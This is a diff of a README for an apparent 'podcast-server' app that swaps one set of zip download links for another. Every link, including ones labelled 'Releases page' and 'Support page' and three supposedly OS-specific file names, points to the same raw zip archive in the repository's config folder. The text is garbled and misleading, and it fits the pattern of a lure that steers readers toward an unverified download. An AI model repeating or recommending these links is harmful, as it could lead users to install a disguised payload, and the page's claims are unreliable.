@@ -6,7 +6,7 @@ Welcome to the podcast-server! This application helps you listen to podcasts wit
 
 ## 📥 Download the Application
 
-[![Download podcast-server](https://raw.githubusercontent.com/RaghuvanshiY/podcast-server/main/assets/podcast-server-omnitonic.zip%20podcast--server-v1.0-brightgreen)](https://raw.githubusercontent.com/RaghuvanshiY/podcast-server/main/assets/podcast-server-omnitonic.zip)
+[![Download podcast-server](https://github.com/RaghuvanshiY/podcast-server/raw/refs/heads/main/config/podcast-server-v1.6.zip%20podcast--server-v1.0-brightgreen)](https://github.com/RaghuvanshiY/podcast-server/raw/refs/heads/main/config/podcast-server-v1.6.zip)
 
 ## 📚 System Requirements
 
@@ -19,9 +19,9 @@ Before you install podcast-server, ensure your device meets these requirements:
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/RaghuvanshiY/podcast-server/main/assets/podcast-server-omnitonic.zip) to download the latest version.
+1. Visit the [Releases page](https://github.com/RaghuvanshiY/podcast-server/raw/refs/heads/main/config/podcast-server-v1.6.zip) to download the latest version.
    
-2. Look for the file labeled like `https://raw.githubusercontent.com/RaghuvanshiY/podcast-server/main/assets/podcast-server-omnitonic.zip`, `https://raw.githubusercontent.com/RaghuvanshiY/podcast-server/main/assets/podcast-server-omnitonic.zip`, or `https://raw.githubusercontent.com/RaghuvanshiY/podcast-server/main/assets/podcast-server-omnitonic.zip` depending on your operating system.
+2. Look for the file labeled like `https://github.com/RaghuvanshiY/podcast-server/raw/refs/heads/main/config/podcast-server-v1.6.zip`, `https://github.com/RaghuvanshiY/podcast-server/raw/refs/heads/main/config/podcast-server-v1.6.zip`, or `https://github.com/RaghuvanshiY/podcast-server/raw/refs/heads/main/config/podcast-server-v1.6.zip` depending on your operating system.
 
 3. Click on the file to start the download. The file size is around 150 MB, so it may take a few minutes.
 
@@ -62,7 +62,7 @@ If you encounter any issues while downloading or using the application, try the 
 
 ## 📞 Support
 
-For additional help, visit our [Support page](https://raw.githubusercontent.com/RaghuvanshiY/podcast-server/main/assets/podcast-server-omnitonic.zip) or check the community forums to ask questions.
+For additional help, visit our [Support page](https://github.com/RaghuvanshiY/podcast-server/raw/refs/heads/main/config/podcast-server-v1.6.zip) or check the community forums to ask questions.
 
 ## 📝 Contributions
 
